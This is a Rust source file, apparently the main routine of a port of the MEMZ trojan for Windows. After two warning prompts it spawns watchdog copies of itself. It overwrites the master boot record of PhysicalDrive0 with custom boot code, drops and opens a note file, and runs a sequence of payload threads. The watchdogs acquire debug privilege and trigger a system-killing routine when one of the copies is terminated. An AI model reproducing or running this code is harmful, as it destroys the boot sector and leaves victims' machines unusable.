use memz_rs::{
    convert_str::{ToPCSTRWrapper},
    data::{
        self,
        code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
        msg::{MEMZ_MSGBOXA_1, MEMZ_MSGBOXA_2},
    },
    payloads::{
        callback::{kill_windows, window_proc},
        function::{payload_thread, N_PAYLOADS, PAYLOADS},
    },
    utils::log::{self, write_log, LogLocation, LogType},
    winapi_type::DWORD,
    wrap_windows_api::*,
    LMEM_ZEROINIT, s_v, MEM_ZEROINIT,
};
use std::{
    mem::size_of,
    process,
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    core::{PCSTR, PCWSTR},
    Win32::{
        Foundation::{
            GetLastError, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, HMODULE, HWND,
            INVALID_HANDLE_VALUE,
        },
        Graphics::Gdi::HBRUSH,
        Security::SE_DEBUG_NAME,
        Storage::FileSystem::{
            WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_FLAGS_AND_ATTRIBUTES,
            FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
        },
        System::{
            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
        },
        UI::{
            Shell::{SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOA},
            WindowsAndMessaging::{
                CreateWindowExA, DispatchMessageA, TranslateMessage, CS_HREDRAW, CS_VREDRAW,
                HCURSOR, HICON, HMENU, IDYES, MB_ICONWARNING, MB_YESNO, MSG, SM_CXSCREEN,
                SM_CYSCREEN, SW_SHOWDEFAULT, WINDOW_EX_STYLE, WINDOW_STYLE, WNDCLASSEXA,
            },
        },
    },
};

fn main() -> Result<(), WinError> {
    log::new_log();
    let (_scrw, _scrh) = (
        wrap_get_system_metrics(SM_CXSCREEN)?,
        wrap_get_system_metrics(SM_CYSCREEN)?,
    );

    let argv = if std::env::args().collect::<Vec<_>>().is_empty() {
        None
    } else {
        Some(std::env::args().collect::<Vec<_>>())
    };
    let argc = argv.clone().unwrap().len();
    let arg = if argc > 1 {
        argv.unwrap()[1].clone()
    } else {
        "No Args".to_owned()
    };

    if arg == "/watchdog" {
        let watchdog_thread = thread::spawn(watchdog_thread);
        watchdog_thread.join().unwrap().unwrap();

        let c: WNDCLASSEXA = WNDCLASSEXA {
            cbSize: size_of::<WNDCLASSEXA>() as u32,
            style: CS_HREDRAW | CS_VREDRAW,
            lpfnWndProc: Some(window_proc),
            cbClsExtra: 0,
            cbWndExtra: 0,
            hInstance: HMODULE(0),
            hIcon: HICON(0),
            hCursor: HCURSOR(0),
            hbrBackground: HBRUSH(0),
            lpszMenuName: PCSTR::null(),
            lpszClassName: *"hax".to_pcstr(),
            hIconSm: HICON(0),
        };

        wrap_register_class_ex_a(&c)?;

        let hwnd = unsafe {
            CreateWindowExA(
                WINDOW_EX_STYLE(0),
                *"hax".to_pcstr(),
                PCSTR::null(),
                WINDOW_STYLE(0),
                0,
                0,
                100,
                100,
                HWND(0),
                HMENU(0),
                HMODULE(0),
                None,
            )
        };

        if hwnd.0 == 0 {
            panic!("CreateWindowExA is NULL\n")
        }

        let mut msg: MSG = Default::default();
        while wrap_get_message(&mut msg, hwnd, 0, 0)? {
            unsafe {
                if !TranslateMessage(&msg).as_bool() {
                    write_log(
                        LogType::ERROR,
                        LogLocation::ALL,
                        "Failed TranslateMessage()\nError: message is not translated",
                    );
                    return Err(WinError::Failed);
                };

                DispatchMessageA(&msg); // return value generally is ignored
            };
        }
    } else {
        if wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_1), "MEMZ", MB_YESNO | MB_ICONWARNING)? != IDYES
            || wrap_messagebox_a(HWND(0), s_v!(MEMZ_MSGBOXA_2), "MEMZ", MB_YESNO | MB_ICONWARNING)?
                != IDYES
        {
            process::exit(0);
        }

        let mut fn_buf = vec![LMEM_ZEROINIT; 16384]; // alloc 8192 * 2
        wrap_get_module_file_name(
            HMODULE::default(),
            &mut fn_buf,
        )?;

        let path = String::from_utf16(&fn_buf).expect("Cannot convert fn_buf");

        for _ in 0..5 {
            wrap_shell_execute_w(
                HWND(0),
                PCWSTR::null(),
                path.as_str(),
                "/watchdog",
                PCWSTR::null(),
                SW_SHOWDEFAULT,
            )?;
        }

        let info = SHELLEXECUTEINFOA {
            cbSize: size_of::<SHELLEXECUTEINFOA>() as u32,
            fMask: SEE_MASK_NOCLOSEPROCESS,
            hwnd: HWND(0),
            lpVerb: PCSTR::null(),
            lpFile: *path.as_str().to_pcstr(),
            lpParameters: *"/main".to_pcstr(),
            lpDirectory: PCSTR::null(),
            nShow: SW_SHOWDEFAULT.0 as i32,
            hInstApp: HMODULE(0),
            ..Default::default()
        };

        wrap_set_priority_class(info.hProcess, HIGH_PRIORITY_CLASS.0)?;

        process::exit(0);
    }

    let drive = wrap_create_file_a(
        *"\\\\.\\PhysicalDrive0".to_pcstr(),
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES::default(),
        HANDLE::default(),
    )
    .unwrap();

    let mut boot_code = vec![MEM_ZEROINIT; 65536];
    boot_code[..CODE1_LEN].copy_from_slice(&CODE1[..CODE1_LEN]);
    boot_code[0x1fe..(0x1fe + CODE2_LEN)].copy_from_slice(&CODE2[..CODE2_LEN]);

    let mut wb: DWORD = Default::default();

    if !unsafe { WriteFile(drive, Some(&boot_code), Some(&mut wb), None).as_bool() } {
        #[cfg(not(feature = "DEBUG_MODE"))]
        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
            GetLastError()
        });

        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::ALL,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(drive)?;

    let note = wrap_create_file_a(
        "\\note.txt",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        HANDLE::default(),
    )
    .unwrap();

    if !unsafe { WriteFile(note, Some(data::msg::MSG.as_bytes()), Some(&mut wb), None).as_bool() } {
        #[cfg(not(feature = "DEBUG_MODE"))]
        eprintln!("Failed WriteFile()\nGetLastError: {:?}", unsafe {
            GetLastError()
        });

        #[cfg(feature = "DEBUG_MODE")]
        write_log(
            LogType::ERROR,
            LogLocation::ALL,
            &format!("Failed CreateFileA()\nGetLastError: {:?}", unsafe {
                GetLastError()
            }),
        );
        return Err(WinError::Failed);
    }

    wrap_close_handle(note)?;

    wrap_shell_execute_w(
        HWND::default(),
        PCWSTR::null(),
        "notepad",
        "\\note.txt",
        PCWSTR::null(),
        SW_SHOWDEFAULT,
    )?;

    for payload in PAYLOADS.iter().take(N_PAYLOADS) {
        sleep(Duration::from_millis(payload.delay as u64));
        let payload_thread = thread::spawn(move || payload_thread(payload));
        payload_thread.join().unwrap();
    }

    loop {
        sleep(Duration::from_millis(10000))
    }
}

fn watchdog_thread() -> Result<(), WinError> {
    let mut oproc = 0;
    let mut f_buf1: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
    wrap_get_process_image_filename_a(&mut f_buf1)?;
    #[cfg(feature = "DEBUG_MODE")]
    {
        let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
        let data = data.replace("\0", "");
        write_log(LogType::INFO, LogLocation::ALL, &data);
        sleep(Duration::from_millis(500));
    }
    sleep(Duration::from_millis(1000));

    set_privilege(SE_DEBUG_NAME, true)?;

    #[cfg(feature = "DEBUG_MODE")]
    {
        write_log(
            LogType::INFO,
            LogLocation::LOG,
            &format!("{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?)),
        );
    }
    loop {
        let snapshot = wrap_create_toolhelp32_snapshot()?;
        #[cfg(feature = "DEBUG_MODE")]
        {
            write_log(
                LogType::INFO,
                LogLocation::LOG,
                &format!("{:?}", dbg!(&snapshot)),
            );
            sleep(Duration::from_millis(500));
        }
        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>() as u32,
            ..Default::default()
        };

        unsafe {
            Process32First(snapshot, &mut proc);
            #[cfg(feature = "DEBUG_MDOE")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace('\0', "");

                let th32_process_id = format!(
                    "Process32First() proc.th32ProcessID: {}",
                    proc.th32ProcessID
                );
                let sz_exe_file = format!("Process32First() proc.szExeFile: {}", file);
                write_log(LogType::INFO, LogLocation::ALL, &th32_process_id);
                write_log(LogType::INFO, LogLocation::ALL, &sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }

        let mut nproc = 0;
        loop {
            let mut h_proc: Option<HANDLE> = None;
            if proc.th32ProcessID != 0 {
                unsafe {
                    h_proc = match OpenProcess(
                        PROCESS_QUERY_INFORMATION, // Permission Denined: PROCESS_QUERY_INFORMATION
                        FALSE,
                        proc.th32ProcessID,
                    ) {
                        Ok(handle) => Some(handle),
                        Err(e) => {
                            let data = "OpenProcessError: The target process is running with administrator privileges or is a protected process.";
                            write_log(
                                LogType::ERROR,
                                LogLocation::ALL,
                                &format!("{}\n{}\n", data, dbg!(&e)),
                            );
                            None
                        }
                    };
                }
            }
            #[cfg(feature = "DEBUG_MODE")]
            {
                write_log(
                    LogType::INFO,
                    LogLocation::LOG,
                    &format!("{:?}\n", dbg!(&h_proc)),
                );
                sleep(Duration::from_millis(500));
            }
            let mut f_buf2: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
            wrap_get_process_image_filename_a(&mut f_buf2)?;
            #[cfg(feature = "DEBUG_MODE")]
            {
                let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
                let data = data.replace('\0', "");
                write_log(LogType::INFO, LogLocation::LOG, &format!("{}\n", data));
                sleep(Duration::from_millis(500));
            }
            if f_buf1 != f_buf2 {
                nproc += 1;
                #[cfg(feature = "DEBUG_MODE")]
                {
                    write_log(
                        LogType::INFO,
                        LogLocation::LOG,
                        &format!("{}\n", dbg!(&nproc)),
                    );
                    sleep(Duration::from_millis(500));
                }
            }

            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
            drop(f_buf2);

            #[cfg(not(feature = "DEBUG_MODE"))]
            if !wrap_process32_next(snapshot, &mut proc) {
                break;
            }
            #[cfg(feature = "DEBUG_MODE")]
            if dbg!(!wrap_process32_next(snapshot, &mut proc)) {
                break;
            }

            if proc.th32ProcessID == 0 {
                write_log(
                    LogType::ERROR,
                    LogLocation::ALL,
                    "Unable to open system process",
                );
                panic!("Unable to open system process");
            }

            #[cfg(feature = "DEBUG_MODE")]
            {
                let file = std::str::from_utf8(&proc.szExeFile).unwrap();
                let file = file.replace('\0', "");
                let th32_process_id =
                    format!("Process32Next() proc.th32ProcessID {}", proc.th32ProcessID);
                let sz_exe_file = format!("Process32Next() proc.szExeFile: {}", file);
                write_log(LogType::INFO, LogLocation::ALL, &th32_process_id);
                write_log(LogType::INFO, LogLocation::ALL, &sz_exe_file);
                sleep(Duration::from_millis(500));
            }
        }
        wrap_close_handle(snapshot)?;

        if nproc < oproc {
            kill_windows()?;
        }
        oproc = nproc;

        sleep(Duration::from_millis(10));
    }
}
